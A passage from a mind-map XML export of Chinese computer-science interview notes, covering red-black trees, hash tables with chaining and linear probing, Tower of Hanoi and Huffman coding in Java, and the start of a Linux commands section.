    </p>
    <ul>
      <li>
        如果右子节点是红色的而左子节点是黑色的，进行左旋转；
      </li>
      <li>
        如果左子节点是红色的，而且左子节点的左子节点也是红色的，进行右旋转；
      </li>
      <li>
        如果左右子节点均为红色的，进行颜色转换。
      </li>
    </ul>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4c457532-550b-4eca-b881-037b84b4934b.jpg" width="430"/>
    <br/>
    

    <pre>@Override
public void put(Key key, Value value) {
    root = put(root, key, value);
    root.color = BLACK;
}
private Node put(Node x, Key key, Value value) {
    if (x == null) {
        Node node = new Node(key, value, 1);
        node.color = RED;
        return node;
    }
    int cmp = key.compareTo(x.key);
    if (cmp == 0)
        x.val = value;
    else if (cmp &lt; 0)
        x.left = put(x.left, key, value);
    else
        x.right = put(x.right, key, value);
    if (isRed(x.right) &amp;&amp; !isRed(x.left))
        x = rotateLeft(x);
    if (isRed(x.left) &amp;&amp; isRed(x.left.left))
        x = rotateRight(x);
    if (isRed(x.left) &amp;&amp; isRed(x.right))
        flipColors(x);
    recalculateSize(x);
    return x;
}</pre>
    <p>
      可以看到该插入操作和二叉查找树的插入操作类似，只是在最后加入了旋转和颜色变换操作即可。
    </p>
    <p>
      根节点一定为黑色，因为根节点没有上层节点，也就没有上层节点的左链接指向根节点。flipColors() 有可能会使得根节点的颜色变为红色，每当根节点由红色变成黑色时树的黑链接高度加 1.
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_314860322" CREATED="1754751617690" MODIFIED="1754751617692"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      一颗大小为 N 的红黑树的高度不会超过 2logN。最坏的情况下是它所对应的 2-3 树，构成最左边的路径节点全部都是 3- 节点而其余都是 2- 节点。
    </p>
    <p>
      红黑树大多数的操作所需要的时间都是对数级别的。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_65888263" CREATED="1754751617692" MODIFIED="1754751617695"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      散列表
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      散列表类似于数组，可以把散列表的散列值看成数组的索引值。访问散列表和访问数组元素一样快速，它可以在常数时间内实现查找和插入操作。
    </p>
    <p>
      由于无法通过散列值知道键的大小关系，因此散列表无法实现有序性操作。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1014877758" CREATED="1754751617696" MODIFIED="1754751617699"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 散列函数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      对于一个大小为 M 的散列表，散列函数能够把任意键转换为 [0, M-1] 内的正整数，该正整数即为 hash 值。
    </p>
    <p>
      散列表存在冲突，也就是两个不同的键可能有相同的 hash 值。
    </p>
    <p>
      散列函数应该满足以下三个条件：
    </p>
    <ul>
      <li>
        一致性：相等的键应当有相等的 hash 值，两个键相等表示调用 equals() 返回的值相等。
      </li>
      <li>
        高效性：计算应当简便，有必要的话可以把 hash 值缓存起来，在调用 hash 函数时直接返回。
      </li>
      <li>
        均匀性：所有键的 hash 值应当均匀地分布到 [0, M-1] 之间，如果不能满足这个条件，有可能产生很多冲突，从而导致散列表的性能下降。
      </li>
    </ul>
    <p>
      除留余数法可以将整数散列到 [0, M-1] 之间，例如一个正整数 k，计算 k%M 既可得到一个 [0, M-1] 之间的 hash 值。注意 M 最好是一个素数，否则无法利用键包含的所有信息。例如 M 为 10<sup>k</sup>，那么只能利用键的后 k 位。
    </p>
    <p>
      对于其它数，可以将其转换成整数的形式，然后利用除留余数法。例如对于浮点数，可以将其的二进制形式转换成整数。
    </p>
    <p>
      对于多部分组合的类型，每个部分都需要计算 hash 值，这些 hash 值都具有同等重要的地位。为了达到这个目的，可以将该类型看成 R 进制的整数，每个部分都具有不同的权值。
    </p>
    <p>
      例如，字符串的散列函数实现如下：
    </p>
    <pre>int hash = 0;
for (int i = 0; i &lt; s.length(); i++)
    hash = (R * hash + s.charAt(i)) % M;</pre>
    <p>
      再比如，拥有多个成员的自定义类的哈希函数如下：
    </p>
    <pre>int hash = (((day * R + month) % M) * R + year) % M;</pre>
    <p>
      R 通常取 31。
    </p>
    <p>
      Java 中的 hashCode() 实现了哈希函数，但是默认使用对象的内存地址值。在使用 hashCode() 时，应当结合除留余数法来使用。因为内存地址是 32 位整数，我们只需要 31 位的非负整数，因此应当屏蔽符号位之后再使用除留余数法。
    </p>
    <pre>int hash = (x.hashCode() &amp; 0x7fffffff) % M;</pre>
    <p>
      使用 Java 的 HashMap 等自带的哈希表实现时，只需要去实现 Key 类型的 hashCode() 函数即可。Java 规定 hashCode() 能够将键均匀分布于所有的 32 位整数，Java 中的 String、Integer 等对象的 hashCode() 都能实现这一点。以下展示了自定义类型如何实现 hashCode()：
    </p>
    <pre>public class Transaction {
    private final String who;
    private final Date when;
    private final double amount;
    public Transaction(String who, Date when, double amount) {
        this.who = who;
        this.when = when;
        this.amount = amount;
    }
    public int hashCode() {
        int hash = 17;
        int R = 31;
        hash = R * hash + who.hashCode();
        hash = R * hash + when.hashCode();
        hash = R * hash + ((Double) amount).hashCode();
        return hash;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_973010315" CREATED="1754751617699" MODIFIED="1754751617701"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 拉链法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      拉链法使用链表来存储 hash 值相同的键，从而解决冲突。
    </p>
    <p>
      查找需要分两步，首先查找 Key 所在的链表，然后在链表中顺序查找。
    </p>
    <p>
      对于 N 个键，M 条链表 (N&gt;M)，如果哈希函数能够满足均匀性的条件，每条链表的大小趋向于 N/M，因此未命中的查找和插入操作所需要的比较次数为 ~N/M。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cbbfe06c-f0cb-47c4-bf7b-2780aebd98b2.png" width="330px"/>
    <br/>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_691699476" CREATED="1754751617702" MODIFIED="1754751617704"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 线性探测法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      线性探测法使用空位来解决冲突，当冲突发生时，向前探测一个空位来存储冲突的键。
    </p>
    <p>
      使用线性探测法，数组的大小 M 应当大于键的个数 N（M&gt;N)。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0dbc4f7d-05c9-4aae-8065-7b7ea7e9709e.gif" width="350px"/>
    <br/>
    

    <pre>public class LinearProbingHashST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; {
    private int N = 0;
    private int M = 16;
    private Key[] keys;
    private Value[] values;
    public LinearProbingHashST() {
        init();
    }
    public LinearProbingHashST(int M) {
        this.M = M;
        init();
    }
    private void init() {
        keys = (Key[]) new Object[M];
        values = (Value[]) new Object[M];
    }
    private int hash(Key key) {
        return (key.hashCode() &amp; 0x7fffffff) % M;
    }
}</pre>
  </body>
</html></richcontent>
<node ID="ID_191037181" CREATED="1754751617705" MODIFIED="1754751617706"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3.1 查找
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>public Value get(Key key) {
    for (int i = hash(key); keys[i] != null; i = (i + 1) % M)
        if (keys[i].equals(key))
            return values[i];
    return null;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_870311760" CREATED="1754751617707" MODIFIED="1754751617708"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3.2 插入
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre>public void put(Key key, Value value) {
    resize();
    putInternal(key, value);
}
private void putInternal(Key key, Value value) {
    int i;
    for (i = hash(key); keys[i] != null; i = (i + 1) % M)
        if (keys[i].equals(key)) {
            values[i] = value;
            return;
        }
    keys[i] = key;
    values[i] = value;
    N++;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_294538018" CREATED="1754751617709" MODIFIED="1754751617710"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3.3 删除
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      删除操作应当将右侧所有相邻的键值对重新插入散列表中。
    </p>
    <pre>public void delete(Key key) {
    int i = hash(key);
    while (keys[i] != null &amp;&amp; !key.equals(keys[i]))
        i = (i + 1) % M;
    // 不存在，直接返回
    if (keys[i] == null)
        return;
    keys[i] = null;
    values[i] = null;
    // 将之后相连的键值对重新插入
    i = (i + 1) % M;
    while (keys[i] != null) {
        Key keyToRedo = keys[i];
        Value valToRedo = values[i];
        keys[i] = null;
        values[i] = null;
        N--;
        putInternal(keyToRedo, valToRedo);
        i = (i + 1) % M;
    }
    N--;
    resize();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_389311613" CREATED="1754751617710" MODIFIED="1754751617714"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3.5 调整数组大小
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      线性探测法的成本取决于连续条目的长度，连续条目也叫聚簇。当聚簇很长时，在查找和插入时也需要进行很多次探测。例如下图中 2~4 位置就是一个聚簇。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ace20410-f053-4c4a-aca4-2c603ff11bbe.png" width="340px"/>
    <br/>
    

    <p>
      α = N/M，把 α 称为使用率。理论证明，当 α 小于 1/2 时探测的预计次数只在 1.5 到 2.5 之间。为了保证散列表的性能，应当调整数组的大小，使得 α 在 [1/4, 1/2] 之间。
    </p>
    <pre>private void resize() {
    if (N &gt;= M / 2)
        resize(2 * M);
    else if (N &lt;= M / 8)
        resize(M / 2);
}
private void resize(int cap) {
    LinearProbingHashST&lt;Key, Value&gt; t = new LinearProbingHashST&lt;Key, Value&gt;(cap);
    for (int i = 0; i &lt; M; i++)
        if (keys[i] != null)
            t.putInternal(keys[i], values[i]);
    keys = t.keys;
    values = t.values;
    M = t.M;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_64095100" CREATED="1754751617715" MODIFIED="1754751617715"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      小结
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1359255901" CREATED="1754751617717" MODIFIED="1754751617718"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 符号表算法比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <table>
      <tr>
        <th>
          算法
        </th>
        <th>
          插入
        </th>
        <th>
          查找
        </th>
        <th>
          是否有序
        </th>
      </tr>
      <tr>
        <td>
          链表实现的无序符号表
        </td>
        <td>
          N
        </td>
        <td>
          N
        </td>
        <td>
          yes
        </td>
      </tr>
      <tr>
        <td>
          二分查找实现的有序符号表
        </td>
        <td>
          N
        </td>
        <td>
          logN
        </td>
        <td>
          yes
        </td>
      </tr>
      <tr>
        <td>
          二叉查找树
        </td>
        <td>
          logN
        </td>
        <td>
          logN
        </td>
        <td>
          yes
        </td>
      </tr>
      <tr>
        <td>
          2-3 查找树
        </td>
        <td>
          logN
        </td>
        <td>
          logN
        </td>
        <td>
          yes
        </td>
      </tr>
      <tr>
        <td>
          拉链法实现的散列表
        </td>
        <td>
          N/M
        </td>
        <td>
          N/M
        </td>
        <td>
          no
        </td>
      </tr>
      <tr>
        <td>
          线性探测法实现的散列表
        </td>
        <td>
          1
        </td>
        <td>
          1
        </td>
        <td>
          no
        </td>
      </tr>
    </table>
    <p>
      应当优先考虑散列表，当需要有序性操作时使用红黑树。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_334189617" CREATED="1754751617719" MODIFIED="1754751617720"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. Java 的符号表实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        java.util.TreeMap：红黑树
      </li>
      <li>
        java.util.HashMap：拉链法的散列表
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_813640896" CREATED="1754751617721" MODIFIED="1754751617722"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 稀疏向量乘法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      当向量为稀疏向量时，可以使用符号表来存储向量中的非 0 索引和值，使得乘法运算只需要对那些非 0 元素进行即可。
    </p>
    <pre>public class SparseVector {
    private HashMap&lt;Integer, Double&gt; hashMap;
    public SparseVector(double[] vector) {
        hashMap = new HashMap&lt;&gt;();
        for (int i = 0; i &lt; vector.length; i++)
            if (vector[i] != 0)
                hashMap.put(i, vector[i]);
    }
    public double get(int i) {
        return hashMap.getOrDefault(i, 0.0);
    }
    public double dot(SparseVector other) {
        double sum = 0;
        for (int i : hashMap.keySet())
            sum += this.get(i) * other.get(i);
        return sum;
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1431353761" CREATED="1754750433506" MODIFIED="1754751623244" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E5%85%B6%E5%AE%83.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    其它
  </body>
</html>
</richcontent>
<node ID="ID_152612745" CREATED="1754751623245" MODIFIED="1754751623248"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      汉诺塔
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/69d6c38d-1dec-4f72-ae60-60dbc10e9d15.png" width="300"/>
    <br/>
    

    <p>
      有三个柱子，分别为 from、buffer、to。需要将 from 上的圆盘全部移动到 to 上，并且要保证小圆盘始终在大圆盘上。
    </p>
    <p>
      这是一个经典的递归问题，分为三步求解：
    </p>
    <p>
      ① 将 n-1 个圆盘从 from -&gt; buffer
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9240aa1-8d48-4959-b28a-7ca45c3e4d91.png" width="300"/>
    <br/>
    

    <p>
      ② 将 1 个圆盘从 from -&gt; to
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f579cab0-3d49-4d00-8e14-e9e1669d0f9f.png" width="300"/>
    <br/>
    

    <p>
      ③ 将 n-1 个圆盘从 buffer -&gt; to
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d02f74dd-8e33-4f3c-bf29-53203a06695a.png" width="300"/>
    <br/>
    

    <p>
      如果只有一个圆盘，那么只需要进行一次移动操作。
    </p>
    <p>
      从上面的讨论可以知道，a<sub>n</sub>&#xa0;= 2 * a<sub>n-1</sub>&#xa0;+ 1，显然 a<sub>n</sub>&#xa0;= 2<sup>n</sup>&#xa0;- 1，n 个圆盘需要移动 2<sup>n</sup>&#xa0;- 1 次。
    </p>
    <pre>public class Hanoi {
    public static void move(int n, String from, String buffer, String to) {
        if (n == 1) {
            System.out.println(&quot;from &quot; + from + &quot; to &quot; + to);
            return;
        }
        move(n - 1, from, to, buffer);
        move(1, from, buffer, to);
        move(n - 1, buffer, from, to);
    }
    public static void main(String[] args) {
        Hanoi.move(3, &quot;H1&quot;, &quot;H2&quot;, &quot;H3&quot;);
    }
}</pre>
    <pre>from H1 to H3
from H1 to H2
from H3 to H2
from H1 to H3
from H2 to H1
from H2 to H3
from H1 to H3</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_77168364" CREATED="1754751623248" MODIFIED="1754751623251"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      哈夫曼编码
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      根据数据出现的频率对数据进行编码，从而压缩原始数据。
    </p>
    <p>
      例如对于一个文本文件，其中各种字符出现的次数如下：
    </p>
    <ul>
      <li>
        a : 10
      </li>
      <li>
        b : 20
      </li>
      <li>
        c : 40
      </li>
      <li>
        d : 80
      </li>
    </ul>
    <p>
      可以将每种字符转换成二进制编码，例如将 a 转换为 00，b 转换为 01，c 转换为 10，d 转换为 11。这是最简单的一种编码方式，没有考虑各个字符的权值（出现频率）。而哈夫曼编码采用了贪心策略，使出现频率最高的字符的编码最短，从而保证整体的编码长度最短。
    </p>
    <p>
      首先生成一颗哈夫曼树，每次生成过程中选取频率最少的两个节点，生成一个新节点作为它们的父节点，并且新节点的频率为两个节点的和。选取频率最少的原因是，生成过程使得先选取的节点位于树的更低层，那么需要的编码长度更长，频率更少可以使得总编码长度更少。
    </p>
    <p>
      生成编码时，从根节点出发，向左遍历则添加二进制位 0，向右则添加二进制位 1，直到遍历到叶子节点，叶子节点代表的字符的编码就是这个路径编码。
    </p>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8edc5164-810b-4cc5-bda8-2a2c98556377.jpg" width="300"/>
    <br/>
    

    <pre>public class Huffman {
    private class Node implements Comparable&lt;Node&gt; {
        char ch;
        int freq;
        boolean isLeaf;
        Node left, right;
        public Node(char ch, int freq) {
            this.ch = ch;
            this.freq = freq;
            isLeaf = true;
        }
        public Node(Node left, Node right, int freq) {
            this.left = left;
            this.right = right;
            this.freq = freq;
            isLeaf = false;
        }
        @Override
        public int compareTo(Node o) {
            return this.freq - o.freq;
        }
    }
    public Map&lt;Character, String&gt; encode(Map&lt;Character, Integer&gt; frequencyForChar) {
        PriorityQueue&lt;Node&gt; priorityQueue = new PriorityQueue&lt;&gt;();
        for (Character c : frequencyForChar.keySet()) {
            priorityQueue.add(new Node(c, frequencyForChar.get(c)));
        }
        while (priorityQueue.size() != 1) {
            Node node1 = priorityQueue.poll();
            Node node2 = priorityQueue.poll();
            priorityQueue.add(new Node(node1, node2, node1.freq + node2.freq));
        }
        return encode(priorityQueue.poll());
    }
    private Map&lt;Character, String&gt; encode(Node root) {
        Map&lt;Character, String&gt; encodingForChar = new HashMap&lt;&gt;();
        encode(root, &quot;&quot;, encodingForChar);
        return encodingForChar;
    }
    private void encode(Node node, String encoding, Map&lt;Character, String&gt; encodingForChar) {
        if (node.isLeaf) {
            encodingForChar.put(node.ch, encoding);
            return;
        }
        encode(node.left, encoding + '0', encodingForChar);
        encode(node.right, encoding + '1', encodingForChar);
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node POSITION="bottom_or_right" ID="ID_470061539" CREATED="1754750432485" MODIFIED="1754750432489"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E7%AE%97%E6%B3%95%20-%20%E7%9B%AE%E5%BD%95.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Sedgewick, Robert, and Kevin Wayne. <em>Algorithms</em>. Addison-Wesley Professional, 2011.
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_878792268" CREATED="1754749800773" MODIFIED="1754750437691" LINK="https://github.com/CyC2018/CS-Notes/blob/master/assets/%E5%86%85%E6%8E%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字节跳动内推
    </p>
  </body>
</html>
</richcontent>
<node TEXT="https://job.toutiao.com/s/iVYD4ht" ID="ID_1646406357" CREATED="1754750437679" MODIFIED="1754750437691" LINK="https://job.toutiao.com/s/iVYD4ht"/>
</node>
</node>
<node POSITION="top_or_left" ID="ID_1749623871" CREATED="1754749744645" MODIFIED="1754749802450" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>操作系统</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_124143961" CREATED="1754749802441" MODIFIED="1754750442086" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E7%9B%AE%E5%BD%95.md" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      计算机操作系统
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1112927707" CREATED="1754750442064" MODIFIED="1754750442066" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E6%A6%82%E8%BF%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    概述
  </body>
</html>
</richcontent>
</node>
<node ID="ID_184772523" CREATED="1754750442067" MODIFIED="1754750442071" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    进程管理
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1565421555" CREATED="1754750442072" MODIFIED="1754750442074" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E6%AD%BB%E9%94%81.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    死锁
  </body>
</html>
</richcontent>
</node>
<node ID="ID_490917833" CREATED="1754750442076" MODIFIED="1754750442078" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    内存管理
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1544022857" CREATED="1754750442079" MODIFIED="1754750442081" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    设备管理
  </body>
</html>
</richcontent>
</node>
<node ID="ID_1076999277" CREATED="1754750442082" MODIFIED="1754750442084" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E9%93%BE%E6%8E%A5.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    链接
  </body>
</html>
</richcontent>
</node>
<node POSITION="bottom_or_right" ID="ID_232542322" CREATED="1754750441029" MODIFIED="1754750441031"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E7%9B%AE%E5%BD%95.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014.
      </li>
      <li>
        汤子瀛, 哲凤屏, 汤小丹. 计算机操作系统[M]. 西安电子科技大学出版社, 2001.
      </li>
      <li>
        Bryant, R. E., &amp; O’Hallaron, D. R. (2004). 深入理解计算机系统.
      </li>
      <li>
        史蒂文斯. UNIX 环境高级编程 [M]. 人民邮电出版社, 2014.
      </li>
      <li>
        <a href="https://applied-programming.github.io/Operating-Systems-Notes/" rel="nofollow">Operating System Notes</a>
      </li>
      <li>
        <a href="https://www.cs.uic.edu/~jbell/CourseNotes/OperatingSystems/2_Structures.html" rel="nofollow">Operating-System Structures</a>
      </li>
      <li>
        <a href="http://cse.csusb.edu/tongyu/courses/cs460/notes/process.php" rel="nofollow">Processes</a>
      </li>
      <li>
        <a href="https://www.slideshare.net/rkolahalam/inter-process-communication-presentation1" rel="nofollow">Inter Process Communication Presentation[1]</a>
      </li>
      <li>
        <a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" rel="nofollow">Decoding UCS Invicta – Part 1</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_355400630" CREATED="1754749802446" MODIFIED="1754750509702" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Linux
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_748010374" CREATED="1754750448807" MODIFIED="1754750448810"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 前言" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#前言">
</a>
    <p dir="auto">
      为了便于理解，本文从常用操作和概念开始讲起。虽然已经尽量做到简化，但是涉及到的内容还是有点多。在面试中，Linux 知识点相对于网络和操作系统等知识点而言不是那么重要，只需要重点掌握一些原理和命令即可。为了方便大家准备面试，在此先将一些比较重要的知识点列出来：
    </p>
    <ul dir="auto">
      <li>
        能简单使用 cat，grep，cut 等命令进行一些操作；
      </li>
      <li>
        文件系统相关的原理，inode 和 block 等概念，数据恢复；
      </li>
      <li>
        硬链接与软链接；
      </li>
      <li>
        进程管理相关，僵尸进程与孤儿进程，SIGCHLD 。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1535130173" CREATED="1754750448811" MODIFIED="1754750448811"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、常用操作以及概念
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1915274459" CREATED="1754750448815" MODIFIED="1754750448818"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      快捷键
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 快捷键" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#快捷键">
</a>
    <ul dir="auto">
      <li>
        Tab：命令和文件名补全；
      </li>
      <li>
        Ctrl+C：中断正在运行的程序；
      </li>
      <li>
        Ctrl+D：结束键盘输入（End Of File，EOF）
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_175871767" CREATED="1754750448818" MODIFIED="1754750448818"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      求助
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_839506888" CREATED="1754750448821" MODIFIED="1754750448823"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. --help
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. --help" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1---help">
</a>
    <p dir="auto">
      指令的基本用法与选项介绍。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_77339209" CREATED="1754750448824" MODIFIED="1754750448829"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. man
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. man" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-man">
</a>
    <p dir="auto">
      man 是 manual 的缩写，将指令的具体信息显示出来。
    </p>
    <p dir="auto">
      当执行 <code>man date</code>&#xa0;时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          代号
        </th>
        <th>
          类型
        </th>
      </tr>
      <tr>
        <td>
          1
        </td>
        <td>
